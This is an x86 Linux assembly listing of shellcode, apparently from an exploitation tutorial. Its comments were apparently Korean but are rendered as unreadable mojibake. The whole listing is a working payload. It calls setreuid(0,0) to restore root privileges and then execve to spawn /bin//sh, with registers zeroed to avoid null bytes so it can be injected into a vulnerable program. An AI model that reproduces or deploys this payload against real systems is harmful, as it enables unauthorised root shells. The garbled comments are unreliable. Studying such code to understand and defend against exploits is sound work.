section .text		; asm�� �ڵ� ���� ����
global _start		; ���� ���� ����

_start:			; �ڵ� ���̺��� ����ϴ� ������ ����
;setreuid (0,0)	; �ռ� �� �ٿ� ����
xor eax, eax		; eax �������͸� ����� ���� ���� �غ�
mov al, 0x46		; syscall #�� 10���� 70(16���� 46)���� ����, �� ����Ʈ
xor ebx, ebx		; ebx �������� �����
xor ecx, ecx		; exc �������� �����
int 0x80			; syscall�� �����ϰ��� Ŀ�� ȣ��

; execve�� �̿��Ͽ� ���ڵ� ����
xor eax, eax		; eax ������Ʈ���� ����� 0���� ����
push eax			; NULL ���� ���ÿ� Ǫ��, eax�� ��
push 0x68732f2f	; '//sh'�� ���ÿ� Ǫ��, ���� '/'�� �е���
push 0x6e69622f	; /bin�� ������ Ǫ��, ���ڿ��� �Ųٷ��ӿ� ����
mov ebx, esp		; esp�� "/bin/sh"�� ����Ŵ, ebx�� ��
push eax			; eax�� ������ NULL, ������ char ** argv�� ������
push ebx			; '/bin/sh'�� �ּҿ� ���� �����Ͱ� ������ �ʿ���, ebx ���
mov ecx, esp		; ���� esp�� argv�� �ּҸ� ����. �̸� ecx�� �̵�
xor edx, edx		; edx�� 0(NULL)���� ä��, �ʼ��� �ƴ�
mov al, 0xb		; syscall #�� 10���� 11(16���� b)�� ����, �� ����Ʈ
int 0x80			; syscall�� �����ϰ��� Ŀ�� ȣ��
